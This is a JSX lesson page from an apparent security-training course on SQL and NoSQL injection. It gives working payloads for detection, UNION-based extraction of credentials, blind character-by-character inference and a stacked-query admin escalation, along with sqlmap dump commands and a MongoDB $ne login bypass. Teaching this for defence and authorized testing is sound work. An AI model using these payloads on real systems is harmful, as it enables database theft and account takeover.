import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function SqlInjection() {
  return (
    <div className="prose-hh">
      <h1>Injection Deep Dive: SQL Injection</h1>
      <p>
        SQL injection happens when user input is concatenated directly into a SQL query instead of being
        treated as pure data. Decades after it was first documented, it remains one of the highest-impact
        vulnerability classes because it can lead directly to full database compromise.
      </p>

      <h2>The vulnerable pattern</h2>
      <CodeBlock label="the mistake, in any language">{`# vulnerable — user input concatenated directly into the query
query = "SELECT * FROM products WHERE id = " + user_input

# if user_input is "1 OR 1=1", the query becomes:
# SELECT * FROM products WHERE id = 1 OR 1=1   <- returns EVERY row`}</CodeBlock>

      <h2>Detecting it</h2>
      <CodeBlock label="classic detection payloads">{`id=1'                    # a single quote often breaks the query -> SQL error in the response
id=1' OR '1'='1           # always-true condition -> returns unexpected extra data
id=1 AND 1=1               # true condition -> normal response
id=1 AND 1=2               # false condition -> different/empty response (confirms injection)`}</CodeBlock>
      <p>
        The AND 1=1 / AND 1=2 pair is the single most reliable detection technique: if the two requests
        produce <em>different</em> responses, the parameter is very likely reaching a SQL query unsanitized.
      </p>

      <h2>Exploiting it: UNION-based extraction</h2>
      <CodeBlock label="the general UNION technique">{`# step 1: find the number of columns the original query returns
id=1 ORDER BY 1--
id=1 ORDER BY 2--
id=1 ORDER BY 3--    # keep incrementing until you get an error — that tells you the column count

# step 2: once you know the column count (say, 3), inject a UNION SELECT
id=-1 UNION SELECT 1,2,3--

# step 3: replace the numbered placeholders with real queries
id=-1 UNION SELECT username, password, 3 FROM users--`}</CodeBlock>
      <Callout variant="tip">
        <p>
          Using <code>id=-1</code> (or any value guaranteed to return zero rows from the original query)
          means only your injected UNION rows come back — much easier to read the results cleanly.
        </p>
      </Callout>

      <h2>Practicing detection with curl</h2>
      <p>
        Every lab in this course that includes a SQL injection challenge is driven the same way real
        testers do it before reaching for a tool like sqlmap — hand-crafted requests via curl, reading the
        response for the tell:
      </p>
      <CodeBlock label="what you'll actually type in the lab terminal">{`curl "http://10.10.60.5/product?id=1"                 # baseline response
curl "http://10.10.60.5/product?id=1' OR '1'='1"        # if this returns MORE data than baseline -> vulnerable`}</CodeBlock>

      <h2>Blind SQL injection (when there's no visible output)</h2>
      <p>
        When the application doesn't display query results directly, you infer answers one bit at a time:
      </p>
      <CodeBlock>{`id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
# if the page behaves differently (true branch) vs a normal page (false branch),
# you've confirmed the first character of the password is 'a' — repeat per character`}</CodeBlock>
      <p>
        This is exactly what sqlmap automates at massive scale — thousands of these micro-requests per
        second — but understanding the manual technique means you can still find and confirm SQLi even
        when automated tools get blocked by a WAF.
      </p>

      <h2>Stacked queries: when injection lets you write, not just read</h2>
      <p>
        Everything above reads data. Some database drivers (notably MSSQL and, when explicitly enabled,
        PostgreSQL) allow <strong>stacked queries</strong> — appending a completely second SQL statement
        after a semicolon in the same request. This escalates SQL injection from a data-leak bug into a
        direct database-write primitive: instead of only reading rows, an attacker can <code>UPDATE</code>,
        <code>INSERT</code>, or <code>DROP</code> in the same request.
      </p>
      <CodeBlock label="a stacked-query privilege escalation">{`id=1; UPDATE users SET role='admin' WHERE username='attacker'--
# the first statement (id=1) is whatever the app expected; everything after the
# semicolon is a SECOND, entirely attacker-authored statement the database also
# executes — here, silently promoting the attacker's own account to admin`}</CodeBlock>
      <Callout variant="warn">
        <p>
          Stacked queries are a categorically more severe finding than a UNION-based read, and worth
          explicitly testing for on any confirmed injectable parameter — MySQL's default client libraries
          block them, which is why this technique shows up far more often against MSSQL- and
          PostgreSQL-backed applications in practice.
        </p>
      </Callout>

      <h2>Automating exploitation: SQLMap</h2>
      <p>
        SQLMap is the tool that automates everything covered above — detection, UNION-based extraction,
        and blind boolean/time-based inference — against a target far faster and more thoroughly than doing
        it by hand. It's the tool every one of the manual techniques in this lesson exists to help you
        understand, not replace.
      </p>
      <CodeBlock label="a typical sqlmap session">{`# step 1: point it at a parameter and let it detect the injection + enumerate databases
sqlmap -u "https://target.com/product?id=1" --batch --dbs

# step 2: once you've picked a database, list its tables
sqlmap -u "https://target.com/product?id=1" --batch -D shopdb --tables

# step 3: dump a specific table's contents
sqlmap -u "https://target.com/product?id=1" --batch --dump -T users`}</CodeBlock>
      <p>
        <code>--batch</code> accepts sqlmap's default answer to every prompt so it runs unattended;
        <code>--dbs</code>, <code>--tables</code>, and <code>--dump</code> walk down the same
        database → table → row hierarchy you'd explore manually with UNION SELECT. Under the hood sqlmap is
        running the exact same family of techniques from this lesson — testing for error-based, UNION-based,
        boolean-blind, and time-based injection in turn, then automating the tedious per-character extraction
        loop.
      </p>
      <Callout variant="danger">
        <p>
          SQLMap is a powerful, noisy tool — it sends a very large number of requests very quickly and is
          trivially detected by any WAF or half-decent logging setup. It is for authorized testing only,
          against targets explicitly in scope, and even then many engagements require throttling it
          (<code>--delay</code>, <code>--threads 1</code>) to avoid degrading a production database's
          performance.
        </p>
      </Callout>

      <h2>NoSQL injection: the same root cause, a different query language</h2>
      <p>
        Everything above assumes a relational database with SQL syntax to break out of. NoSQL databases like
        MongoDB aren't immune to injection — they're vulnerable to the same underlying mistake (trusting
        user input as part of a query structure) expressed through JSON operators instead of SQL syntax. If
        an API endpoint passes a JSON request body's fields directly into a MongoDB query without validating
        their type, a client can submit an <em>operator</em> where the app expected a plain string:
      </p>
      <CodeBlock label="a login check that trusts the shape of the input">{`// intended request:  {"username": "alice", "password": "hunter2"}
// db.users.findOne({ username: "alice", password: "hunter2" })

// attacker-supplied request instead:
{"username": "alice", "password": {"$ne": null}}
// db.users.findOne({ username: "alice", password: { $ne: null } })
// $ne (not-equal) matches ANY non-null password — authentication bypassed with no password guessed at all`}</CodeBlock>
      <p>
        The fix mirrors parameterized queries conceptually even though the mechanism differs: strictly
        validate that fields like <code>password</code> are the expected primitive type (a string) and
        reject anything else — most NoSQL injection is really "we forgot to check the input wasn't itself a
        query operator," the JSON-native sibling of the classic concatenation mistake this lesson opened with.
      </p>

      <h2>The only real fix</h2>
      <p>
        Parameterized queries (prepared statements) — where user input is passed as a bound parameter, never
        concatenated into the query string. Every modern framework supports this; SQL injection in 2026 is
        almost always a case of a developer bypassing the framework's safe default, not a missing feature.
      </p>

      <Callout variant="warn">
        <p>
          You'll practice detecting and exploiting a UNION-based SQL injection directly in this module's
          lab, using the exact <code>curl</code> workflow shown above against a simulated vulnerable
          product page.
        </p>
      </Callout>
    </div>
  );
}
